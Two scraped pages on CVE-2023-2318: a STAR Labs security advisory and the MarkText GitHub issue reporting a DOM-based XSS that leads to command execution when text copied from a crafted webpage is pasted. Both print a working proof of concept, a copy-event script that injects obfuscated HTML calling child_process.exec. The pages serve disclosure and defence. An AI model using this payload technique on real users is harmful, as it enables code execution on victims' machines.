=== Content from starlabs.sg_b0c86aba_20250110_123940.html ===

[![logo](https://starlabs.sg/logo-white.png)](https://starlabs.sg/ "  (Alt + H)")

* [Home](https://starlabs.sg/ "Home")
* [About](https://starlabs.sg/about/ "About")
* [Advisories](https://starlabs.sg/advisories/ "Advisories")
* [Blog](https://starlabs.sg/blog/ "Blog")
* [Achievements](https://starlabs.sg/achievements/ "Achievements")
* [Publications](https://starlabs.sg/publications/ "Publications")
* [Search](https://starlabs.sg/search/ "Search (Alt + /)")

[Home](https://starlabs.sg/) » [Advisories](https://starlabs.sg/advisories/)
# (CVE-2023-2318) MarkText DOM-Based Cross-site Scripting leading to Remote Code Execution

August 19, 2023 · 4 min · Li Jiantao (@CurseRed)

Table of Contents

* [Summary:](#summary)
* [CVSS3.1 Scoring System:](#cvss31-scoring-system)
* [Product Overview:](#product-overview)
* [Vulnerability Summary:](#vulnerability-summary)
* [Vulnerability Details:](#vulnerability-details)
* [Proof-of-Concept:](#proof-of-concept)
* [Suggested Mitigations:](#suggested-mitigations)
* [Detection Guidance:](#detection-guidance)
* [Credits:](#credits)
* [Timeline:](#timeline)

## Summary:[#](#summary)

| **Product** | MarkText |
| --- | --- |
| **Vendor** | MarkText |
| **Severity** | High |
| **Affected Versions** | MarkText <= 0.17.1 |
| **Tested Versions** | MarkText 0.17.1 |
| **CVE Identifier** | CVE-2023-2318 |
| **CVE Description** | DOM-based XSS in src/muya/lib/contentState/pasteCtrl.js in MarkText 0.17.1 and before on Windows, Linux and macOS allows arbitrary JavaScript code to run in the context of MarkText main window. This vulnerability can be exploited if a user copies text from a malicious webpage and paste it into MarkText. |
| **CWE Classification(s)** | CWE-79 - Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’) |
| **CAPEC Classification(s)** | CAPEC-588 DOM-Based XSS, CAPEC-549 Local Execution of Code |

## CVSS3.1 Scoring System:[#](#cvss31-scoring-system)

**Base Score:** 8.6 (High)

**Vector String:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`

| **Metric** | **Value** |
| --- | --- |
| **Attack Vector (AV)** | Local |
| **Attack Complexity (AC)** | Low |
| **Privileges Required (PR)** | None |
| **User Interaction (UI)** | Required |
| **Scope (S)** | Changed |
| **Confidentiality (C)** | High |
| **Integrity (I)** | High |
| **Availability (A)** | High |

## Product Overview:[#](#product-overview)

MarkText is a free and open-source Markdown editor for Windows, macOS, and Linux. It provides a distraction-free writing environment that supports various Markdown features, such as tables, footnotes, and task lists. MarkText also offers live preview, syntax highlighting, and a customizable user interface. Additionally, it allows users to export their documents in HTML and PDF formats.

MarkText is built on Electron, a framework that enables it to run seamlessly on various operating systems. The markdown editor supports converting HTML tags into Markdown format. An attacker can use the vulnerability to execute arbitrary JavaScript code and system commands by convincing the victim to copy from a malicious webpage and paste into MarkText.

## Vulnerability Summary:[#](#vulnerability-summary)

There is a DOM-based XSS in MarkText allowing arbitrary JavaScript code to run in the context of MarkText main window. This vulnerability can be exploited if a user copies text from a malicious webpage and paste it into MarkText.

## Vulnerability Details:[#](#vulnerability-details)

When the user performs paste operations, MarkText will check the clipboard data and try to convert HTML tags into the equivalent Markdown format, and then generate HTML again for markdown preview.

Specifically, when the user copies a link from a webpage and paste it into MarkText, the `<a>` tag will be processed by the following code in [src/muya/lib/contentState/pasteCtrl.js](https://github.com/marktext/marktext/blob/aed36dbf320b17bdd0e44398d5cfe45a4d357940/src/muya/lib/contentState/pasteCtrl.js#L119):

```
const links = Array.from(tempWrapper.querySelectorAll('a'))
for (const link of links) {
  const href = link.getAttribute('href')
  const text = link.textContent   // [1]
  if (URL_REG.test(href) && href === text) {
    const title = await getPageTitle(href)
    if (title) {
      link.innerHTML = sanitize(title, PREVIEW_DOMPURIFY_CONFIG, true)
    } else {
      const span = document.createElement('span')   // [2]
      span.innerHTML = text   // [3]
      link.replaceWith(span)
    }
  }
}

```

This code iterates over all the `<a>` tags. For each tag, if its `href` attribute is the same as its `textContent`, MarkText will try to fetch the URL and extract title from the response, then assign to innerHTML after sanitization.

However, if the title cannot be found, MarkText will create a `<span>` element at `[2]` and assign `textContent` of the original `<a>` tag to `innerHTML` at `[3]` without any sanitization, which results in DOM-based XSS.

## Proof-of-Concept:[#](#proof-of-concept)

An attacker can craft a malicious webpage and hook on the `copy` event with the following code:

```
<script>
  document.addEventListener('copy',e=>{
    e.preventDefault();
    let payload = '';
    if(navigator.platform === 'Win32') {
      payload = decodeURIComponent(atob('JTVCJUUyJTgwJUFBJTVEKCUzQ2ElMjBocmVmJTNEJTIyaHR0cCUzQSUyRiUyRjElM0ExJTJGJTIzJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDNlJTNCJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDIwJTNCb25sb2FkJTNEZXZhbChhdG9iKCdjbVZ4ZFdseVpTZ2lZMmhwYkdSZmNISnZZMlZ6Y3lJcExtVjRaV01vSW01dmRHVndZV1FnUXpwY1hIZHBibVJ2ZDNOY1hIZHBiaTVwYm1raUtRJTNEJTNEJykpJTI2JTIzeDNlJTNCJTIyJTNFaHR0cCUzQSUyRiUyRjElM0ExJTJGJTIzJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDNlJTNCJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDIwJTNCb25sb2FkJTNEZXZhbChhdG9iKCdjbVZ4ZFdseVpTZ2lZMmhwYkdSZmNISnZZMlZ6Y3lJcExtVjRaV01vSW01dmRHVndZV1FnUXpwY1hIZHBibVJ2ZDNOY1hIZHBiaTVwYm1raUtRJTNEJTNEJykpJTI2JTIzeDNlJTNCJTNDJTJGYSUzRSk='));
    } else {
      payload = decodeURIComponent(atob('JTVCJUUyJTgwJUFBJTVEKCUzQ2ElMjBocmVmJTNEJTIyaHR0cCUzQSUyRiUyRjElM0ExJTJGJTIzJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDNlJTNCJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDIwJTNCb25sb2FkJTNEZXZhbChhdG9iKCdjbVZ4ZFdseVpTZ2lZMmhwYkdSZmNISnZZMlZ6Y3lJcExtVjRaV01vSW1kdWIyMWxMV05oYkdOMWJHRjBiM0lnTFdVZ0owMWhjbXRVWlhoMElGSkRSU0JRYjBNbklpayUzRCcpKSUyNiUyM3gzZSUzQiUyMiUzRWh0dHAlM0ElMkYlMkYxJTNBMSUyRiUyMyUyNiUyM3gzYyUzQnN2ZyUyNiUyM3gzZSUzQiUyNiUyM3gzYyUzQnN2ZyUyNiUyM3gyMCUzQm9ubG9hZCUzRGV2YWwoYXRvYignY21WeGRXbHlaU2dpWTJocGJHUmZjSEp2WTJWemN5SXBMbVY0WldNb0ltZHViMjFsTFdOaGJHTjFiR0YwYjNJZ0xXVWdKMDFoY210VVpYaDBJRkpEUlNCUWIwTW5JaWslM0QnKSklMjYlMjN4M2UlM0IlM0MlMkZhJTNFKQ=='))
    }
    e.clipboardData.setData('text/html', payload + window.getSelection());
  })
</script>

```

The base64-encoded part in the PoC is decoded to the following content:

```
require("child_process").exec("notepad C:\\windows\\win.ini") // Windows
require("child_process").exec("gnome-calculator -e 'MarkText RCE PoC'") // Linux

```

When the victim copies text from this page, the payload is added to the copied content and will be triggered when it is pasted into MarkText. This PoC will run system command `notepad` on Windows, or `gnome-calculator` on Linux.

Here are GIFs demonstrating the PoC on Windows and Ubuntu:

![](/advisories/23/images/CVE-2023-2318_01.rce-on-windows.gif)

![](/advisories/23/images/CVE-2023-2318_02.rce-on-ubuntu.gif)

We have attached `poc/poc.html` as PoC of this scenario. A live version can also be found [here](https://o.cal1.cn/c3a8d0cbeea8f9ab-marktext-poc/rce.html).

## Suggested Mitigations:[#](#suggested-mitigations)

It is recommended to sanitize untrusted data before assigning it to `innerHTML`.

For end users who are using the versions affected by this vulnerability, it is suggested to avoid copying text from an untrusted webpage then paste it into MarkText.

## Detection Guidance:[#](#detection-guidance)

It is possible to detect the exploitation of this vulnerability by monitoring if MarkText process spawns any unusual child process.

## Credits:[#](#credits)

Li Jiantao ([@CurseRed](https://twitter.com/CurseRed)) of STAR Labs SG Pte. Ltd. ([@starlabs\_sg](https://twitter.com/starlabs_sg))

## Timeline:[#](#timeline)

* 2023-04-28 GitHub Issue Created (<https://github.com/marktext/marktext/issues/3618>)
* 2023-08-19 Advisory Release

[« Prev

(CVE-2023-2317) Typora DOM-Based Cross-site Scripting leading to Remote Code Execution](https://starlabs.sg/advisories/23/23-2317/)
[Next »

(CVE-2023-2971) Typora Local File Disclosure (Patch Bypass)](https://starlabs.sg/advisories/23/23-2971/)

© 2024 [STAR Labs](https://starlabs.sg/)
Powered by
[Hugo](https://gohugo.io/) &
[PaperMod](https://git.io/hugopapermod)



=== Content from github.com_e003b469_20250110_123939.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmarktext%2Fmarktext%2Fissues%2F3618)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmarktext%2Fmarktext%2Fissues%2F3618)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=marktext%2Fmarktext)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[marktext](/marktext)
/
**[marktext](/marktext/marktext)**
Public

* [Notifications](/login?return_to=%2Fmarktext%2Fmarktext) You must be signed in to change notification settings
* [Fork
  3.6k](/login?return_to=%2Fmarktext%2Fmarktext)
* [Star
   48.2k](/login?return_to=%2Fmarktext%2Fmarktext)

* [Code](/marktext/marktext)
* [Issues
  1.2k](/marktext/marktext/issues)
* [Pull requests
  47](/marktext/marktext/pulls)
* [Actions](/marktext/marktext/actions)
* [Projects
  0](/marktext/marktext/projects)
* [Wiki](/marktext/marktext/wiki)
* [Security](/marktext/marktext/security)
* [Insights](/marktext/marktext/pulse)

Additional navigation options

* [Code](/marktext/marktext)
* [Issues](/marktext/marktext/issues)
* [Pull requests](/marktext/marktext/pulls)
* [Actions](/marktext/marktext/actions)
* [Projects](/marktext/marktext/projects)
* [Wiki](/marktext/marktext/wiki)
* [Security](/marktext/marktext/security)
* [Insights](/marktext/marktext/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fmarktext%2Fmarktext%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fmarktext%2Fmarktext%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Security Issue: DOM-Based XSS leading to RCE #3618

Open

[chromium1337](/chromium1337) opened this issue
Apr 28, 2023
· 2 comments
 · May be fixed by [#3621](https://github.com/marktext/marktext/pull/3621)

Open

# [Security Issue: DOM-Based XSS leading to RCE](#top) #3618

[chromium1337](/chromium1337) opened this issue
Apr 28, 2023
· 2 comments
 · May be fixed by [#3621](https://github.com/marktext/marktext/pull/3621)

## Comments

[![@chromium1337](https://avatars.githubusercontent.com/u/23567548?s=80&u=067095c37f53624b0950cc3b8c990c4a3f4c9033&v=4)](/chromium1337)

Copy link

### **[chromium1337](/chromium1337)** commented [Apr 28, 2023](#issue-1687847262) • edited Loading

| Summary: There is a DOM-based XSS in MarkText allowing arbitrary JavaScript code to run in the context of MarkText main window. This vulnerability can be exploited if a user copies text from a malicious webpage and paste it into MarkText. Vulnerability Details: When the user performs paste operations, MarkText will check the clipboard data and try to convert HTML tags into the equivalent Markdown format, and then generate HTML again for markdown preview.  Specifically, when the user copies a link from a webpage and paste it into MarkText, the `<a>` tag will be processed by the following code in [src/muya/lib/contentState/pasteCtrl.js](https://github.com/marktext/marktext/blob/aed36dbf320b17bdd0e44398d5cfe45a4d357940/src/muya/lib/contentState/pasteCtrl.js#L119):  ``` const links = Array.from(tempWrapper.querySelectorAll('a')) for (const link of links) {   const href = link.getAttribute('href')   const text = link.textContent   // [1]   if (URL_REG.test(href) && href === text) {     const title = await getPageTitle(href)     if (title) {       link.innerHTML = sanitize(title, PREVIEW_DOMPURIFY_CONFIG, true)     } else {       const span = document.createElement('span')   // [2]       span.innerHTML = text   // [3]       link.replaceWith(span)     }   } } ```  This code iterates over all the `<a>` tags. For each tag, if its `href` attribute is the same as its `textContent`, MarkText will try to fetch the URL and extract title from the response, then assign to innerHTML after sanitization.  However, if the title cannot be found, MarkText will create a `<span>` element at `[2]` and assign `textContent` of the original `<a>` tag to `innerHTML` at `[3]` without any sanitization, which results in DOM-based XSS.  This should affect all platforms since MarkText is built on Electron. Tested on:   * MarkText 0.17.1 for Windows * MarkText 0.17.1 for Linux  Proof-of-Concept: An attacker can craft a malicious webpage and hook on the `copy` event with the following code:  ``` <script>   document.addEventListener('copy',e=>{     e.preventDefault();     let payload = '';     if(navigator.platform === 'Win32') {       payload = decodeURIComponent(atob('JTVCJUUyJTgwJUFBJTVEKCUzQ2ElMjBocmVmJTNEJTIyaHR0cCUzQSUyRiUyRjElM0ExJTJGJTIzJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDNlJTNCJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDIwJTNCb25sb2FkJTNEZXZhbChhdG9iKCdjbVZ4ZFdseVpTZ2lZMmhwYkdSZmNISnZZMlZ6Y3lJcExtVjRaV01vSW01dmRHVndZV1FnUXpwY1hIZHBibVJ2ZDNOY1hIZHBiaTVwYm1raUtRJTNEJTNEJykpJTI2JTIzeDNlJTNCJTIyJTNFaHR0cCUzQSUyRiUyRjElM0ExJTJGJTIzJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDNlJTNCJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDIwJTNCb25sb2FkJTNEZXZhbChhdG9iKCdjbVZ4ZFdseVpTZ2lZMmhwYkdSZmNISnZZMlZ6Y3lJcExtVjRaV01vSW01dmRHVndZV1FnUXpwY1hIZHBibVJ2ZDNOY1hIZHBiaTVwYm1raUtRJTNEJTNEJykpJTI2JTIzeDNlJTNCJTNDJTJGYSUzRSk='));     } else {       payload = decodeURIComponent(atob('JTVCJUUyJTgwJUFBJTVEKCUzQ2ElMjBocmVmJTNEJTIyaHR0cCUzQSUyRiUyRjElM0ExJTJGJTIzJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDNlJTNCJTI2JTIzeDNjJTNCc3ZnJTI2JTIzeDIwJTNCb25sb2FkJTNEZXZhbChhdG9iKCdjbVZ4ZFdseVpTZ2lZMmhwYkdSZmNISnZZMlZ6Y3lJcExtVjRaV01vSW1kdWIyMWxMV05oYkdOMWJHRjBiM0lnTFdVZ0owMWhjbXRVWlhoMElGSkRSU0JRYjBNbklpayUzRCcpKSUyNiUyM3gzZSUzQiUyMiUzRWh0dHAlM0ElMkYlMkYxJTNBMSUyRiUyMyUyNiUyM3gzYyUzQnN2ZyUyNiUyM3gzZSUzQiUyNiUyM3gzYyUzQnN2ZyUyNiUyM3gyMCUzQm9ubG9hZCUzRGV2YWwoYXRvYignY21WeGRXbHlaU2dpWTJocGJHUmZjSEp2WTJWemN5SXBMbVY0WldNb0ltZHViMjFsTFdOaGJHTjFiR0YwYjNJZ0xXVWdKMDFoY210VVpYaDBJRkpEUlNCUWIwTW5JaWslM0QnKSklMjYlMjN4M2UlM0IlM0MlMkZhJTNFKQ=='))     }     e.clipboardData.setData('text/html', payload + window.getSelection());   }) </script> ```  The base64-encoded part in the PoC is decoded to the following content:  ``` require("child_process").exec("gnome-calculator -e 'MarkText RCE PoC'") ```  When the victim copies text from this page, the payload is added to the copied content and will be triggered when it is pasted into MarkText. This PoC will run system command `notepad` on Windows, or `gnome-calculator` on Linux.  Here are GIFs demonstrating the PoC on Windows and Ubuntu:  [01 rce-on-windows](https://user-images.githubusercontent.com/23567548/235048870-704b2636-90d5-4d18-a03d-8e8202ef5017.gif)  [02 rce-on-ubuntu](https://user-images.githubusercontent.com/23567548/235048885-ff6cca49-b39d-4d68-82b5-d4a5f1e819cd.gif)  A live version of the PoC can be found [here](https://o.cal1.cn/c3a8d0cbeea8f9ab-marktext-poc/rce.html). Suggested Mitigations: It is recommended to sanitize untrusted data before assigning it to `innerHTML`.  For end users who are using the versions affected by this vulnerability, it is suggested to avoid copying text from an untrusted webpage then paste it into MarkText. Credits: Li Jiantao ([@CurseRed](https://twitter.com/CurseRed)) of STAR Labs SG Pte. Ltd. ([@starlabs\_sg](https://twitter.com/starlabs_sg)) Vulnerability Disclosure: As STAR Labs is a [CVE Numbering Authority (CNA)](https://www.cve.org/PartnerInformation/ListofPartners/partner/STAR_Labs), the following CVE identifiers are reserved by STAR Labs to track the vulnerabilities presented in this report:   1. **[CVE-2023-2318](https://github.com/advisories/GHSA-jv63-mj7w-v6v9 "CVE-2023-2318")**    DOM-Based Cross-site Scripting (XSS) in src/muya/lib/contentState/pasteCtrl.js in MarkText 0.17.1 allows attackers to run arbitrary JavaScript code and execute system commands by convincing the victim to copy text from a crafted webpage and paste it into MarkText.   STAR Labs requests that MarkText use the above reserved CVE identifiers when referencing the vulnerabilities presented in this report instead of requesting for new CVE identifiers (e.g. via MITRE or GitHub Security Advisory) to prevent having duplicate CVE records. |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👀
2
 Teloshav and jacobwhall reacted with eyes emoji

All reactions

* 👀
  2 reactions

[![@Teloshav](https://avatars.githubusercontent.com/u/131397191?s=80&v=4)](/Teloshav)

Copy link

### **[Teloshav](/Teloshav)** commented [May 7, 2023](#issuecomment-1537471995) • edited Loading

| I tried it out on the appimage version but nothing happened for me. Tried copying the text from the [website you linked](https://o.cal1.cn/c3a8d0cbeea8f9ab-marktext-poc/rce.html) but as I said, nothing happened.  Am I doing it wrong?  EDIT!!!!! I WAS DOING IT WRONG!  I have my browser disable javascript by default, so I didn't work. Trying it again with javascript enabled worked!  The shock on my face when I saw my calculator pop up! 😱 |
| --- |

All reactions

Sorry, something went wrong.

[![@Teloshav](https://avatars.githubusercontent.com/u/131397191?s=80&v=4)](/Teloshav)

Copy link

### **[Teloshav](/Teloshav)** commented [May 7, 2023](#issuecomment-1537500525) • edited Loading

| Sweet! I think I actually fixed it!  I'm going to make a pull request.  (Not sure how ANY of this works, so I'm going to see if I do it right!!)  Edit: Seems like my fix won't allow for link pasting now that I've just tried it. I'll have to see what is happening with that. |
| --- |

All reactions

Sorry, something went wrong.

[![@Teloshav](https://avatars.githubusercontent.com/u/131397191?s=40&v=4)](/Teloshav)
[Teloshav](/Teloshav)
linked a pull request
[May 7, 2023](#ref-pullrequest-1699167792)
that will
close
this issue

[Fixed CVE-2023-2318 DOM-based XSS in MarkText bug
#3621](/marktext/marktext/pull/3621)
 Open

[![@jacobwhall](https://avatars.githubusercontent.com/u/55111303?s=40&v=4)](/jacobwhall)
[jacobwhall](/jacobwhall)
mentioned this issue
[Jun 28, 2023](#ref-issue-1779356243)

[Address CVE-2023-2318
jacobwhall/marktext#5](/jacobwhall/marktext/issues/5)

Closed

[![@y1ong](https://avatars.githubusercontent.com/u/49396268?s=40&v=4)](/y1ong)
[y1ong](/y1ong)
mentioned this issue
[Aug 22, 2023](#ref-issue-1860437617)

[MarkText<=0.17.1 存在DOM型XSS漏洞
y1ong/blog-timeline#140](/y1ong/blog-timeline/issues/140)

Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fmarktext%2Fmarktext%2Fissues%2F3618)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [Fixed CVE-2023-2318 DOM-based XSS in MarkText bug](/marktext/marktext/pull/3621)
 [Teloshav/marktext](/Teloshav/marktext)

2 participants

[![@chromium1337](https://avatars.githubusercontent.com/u/23567548?s=52&v=4)](/chromium1337) [![@Teloshav](https://avatars.githubusercontent.com/u/131397191?s=52&v=4)](/Teloshav)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


